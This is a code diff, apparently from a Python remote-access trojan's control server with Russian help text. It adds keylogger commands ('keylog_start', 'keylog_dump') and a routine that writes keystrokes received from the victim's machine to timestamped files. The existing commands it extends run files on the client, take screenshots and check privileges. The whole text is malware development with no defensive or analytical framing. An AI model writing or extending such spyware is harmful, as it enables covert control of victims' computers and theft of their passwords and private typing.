@@ -5,6 +5,7 @@ import base64
 import logging
 import signal
 import sys
+import datetime
 
 logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(message)s")
 
@@ -35,6 +36,8 @@ def show_help():
     start <file>        - Запустить файл на клиенте.
     screenshot          - Сделать скриншот на клиенте и передать его на сервер.
     check               - Проверить привилегии клиента (Администратор/Пользователь).
+    keylog_start        - Запустить кейлогер.
+    keylog_dump         - Показать результат кейлога.
     q                   - Выйти из сеанса.
     help                - Показать эту справку.
     """
@@ -78,6 +81,20 @@ def save_screenshot(target, screenshot_id):
         logging.error(f"Ошибка сохранения скриншота: {e}")
 
 
+def save_keylogs(logs):
+    if logs.strip() and logs.startswith("[!!]"):
+        timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+        file_name = f"keylog_{timestamp}.txt"
+        try:
+            with open(file_name, "w") as lof_file:
+                lof_file.write(logs + "\n")
+            logging.info(f"[+] Кейлог сохранен в файл: {file_name}")
+        except Exception as e:
+            logging.error(f"[!!] Ошибка при сохранении кейлогов: {e}")
+    else:
+        logging.warning("[!!] Кейлог пуст.")
+
+
 def shell(target, ip):
     screenshot_id = 1
     try:
@@ -92,6 +109,8 @@ def shell(target, ip):
             elif command == "help":
                 show_help()
                 continue
+            elif command.startswith("keylog_start"):
+                continue
             elif command.startswith("cd"):
                 response = reliable_recv(target)
                 print(response)
@@ -102,6 +121,9 @@ def shell(target, ip):
             elif command.startswith("screenshot"):
                 save_screenshot(target, screenshot_id)
                 screenshot_id += 1
+            elif command.startswith("keylog_dump"):
+                logs = reliable_recv(target)
+                save_keylogs(logs)
             else:
                 try:
                     response = reliable_recv(target)
